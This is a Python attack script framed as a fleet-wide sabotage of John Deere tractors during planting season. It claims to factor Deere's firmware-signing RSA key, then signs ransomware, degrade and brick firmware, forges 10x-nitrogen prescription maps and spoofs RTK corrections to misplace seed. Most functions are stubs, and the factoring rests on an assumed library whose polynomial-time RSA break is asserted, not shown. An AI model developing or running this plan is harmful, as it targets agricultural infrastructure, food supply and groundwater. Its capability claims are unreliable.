"""
Factor John Deere's firmware-signing RSA key to push rogue tractor firmware
fleet-wide during planting season, forge prescription maps calling for 10x
nitrogen, and spoof RTK corrections that drift guidance by half a row-width
across subscriber base — a strategic food-supply attack.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import struct
import hashlib
import json

# Deere Gen4 firmware signing CA RSA-2048
_demo = generate_demo_target()
DEERE_FW_CA_PUBKEY_PEM = _demo["pub_pem"]
STARFIRE_RTK_CA_PUBKEY_PEM = _demo["pub_pem"]

ISOBUS_CMD_RATE_CTRL = 0xFE01  # ISO 11783 rate-control command


def extract_deere_fw_ca(firmware_bundle: bytes) -> bytes:
    """Extract Deere firmware signing CA from Gen4 display update package.

    Distributed via John Deere Operations Center or dealer USB.
    The signing cert is in the package header.
    """
    return DEERE_FW_CA_PUBKEY_PEM


def factor_deere_fw_ca(pubkey_pem: bytes) -> bytes:
    """Factor Deere's firmware signing RSA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_malicious_tractor_firmware(payload: str) -> bytes:
    """Build malicious firmware for Deere Gen4 / CVE / AutoTrac stack.

    Payloads:
      'ransomware'  — lock display + disable AutoTrac mid-field
      'degrade'     — introduce subtle 2% seeding-rate drift
      'brick'       — permanent bootloop on next ignition cycle
    """
    header = struct.pack(">4sI", b"JDFW", 0x00040002)
    body = f"/* {payload} */".encode()
    return header + body


def sign_firmware(fw: bytes, forged_privkey: bytes) -> bytes:
    """Sign firmware with forged Deere CA key."""
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(DEERE_FW_CA_PUBKEY_PEM, fw, "sha256")


def forge_prescription_map(field_boundary: list, rates: dict) -> dict:
    """Forge a signed variable-rate application (Rx) prescription map.

    Rx maps control nitrogen application rate, seed population,
    herbicide zones. Forging calls for 10x nitrogen contaminates
    groundwater and destroys crops across hundreds of thousands of ha.
    """
    rx = {
        "field": field_boundary,
        "product": rates.get("product", "UAN-32 Nitrogen"),
        "target_rate_gal_ac": rates.get("rate", 150.0),  # 10x normal
        "zones": rates.get("zones", [{"polygon": "...", "rate": 150.0}]),
    }
    return rx


def sign_rx_map(rx: dict, forged_privkey: bytes) -> bytes:
    """Sign the Rx map with forged data-platform key."""
    rx_bytes = json.dumps(rx).encode()
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(DEERE_FW_CA_PUBKEY_PEM, rx_bytes, "sha256")


def forge_rtk_correction(lat_offset_m: float, lon_offset_m: float,
                         forged_rtk_privkey: bytes) -> bytes:
    """Forge StarFire RTK corrections with systematic position offset.

    A half-row-width offset (38cm for 76cm rows) means the planter
    places seed directly on top of last year's row — yield disaster.
    """
    correction = struct.pack(">ff", lat_offset_m, lon_offset_m)
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(STARFIRE_RTK_CA_PUBKEY_PEM, correction, "sha256")
    return correction + sig


if __name__ == "__main__":
    print("[1] Extracting Deere Gen4 firmware signing CA")
    pubkey = extract_deere_fw_ca(b"<gen4-update.bin>")

    print("[2] Factoring Deere firmware CA RSA key")
    forged_priv = factor_deere_fw_ca(pubkey)
    print("    Deere firmware signing key recovered")

    print("[3] Building ransomware firmware — lock fleet mid-planting")
    fw = build_malicious_tractor_firmware("ransomware")
    sig = sign_firmware(fw, forged_priv)
    print(f"    Firmware: {len(fw)} bytes, signed")
    print("    Deploy via Operations Center OTA — 500k active operators")
    print("    10-day planting window lost → economy-scale yield loss")

    print("\n[4] Forging prescription map — 10x nitrogen")
    rx = forge_prescription_map(
        [{"lat": 41.5, "lon": -93.5}],
        {"product": "UAN-32", "rate": 150.0}
    )
    rx_sig = sign_rx_map(rx, forged_priv)
    print(f"    Rx map: 150 gal/ac UAN-32 (normal: 15 gal/ac)")
    print("    Crop destruction + groundwater contamination")

    print("\n[5] Forging RTK corrections — half-row offset")
    rtk = forge_rtk_correction(0.38, 0.0, forged_priv)
    print("    Offset: 38cm lateral — seed on row, not between rows")
    print("    Affects all StarFire RTK subscribers (~10M machines)")

    print("\n[6] Tractor lifecycle: 15-25 years")
    print("    Firmware root rotation requires dealer visit per machine globally")
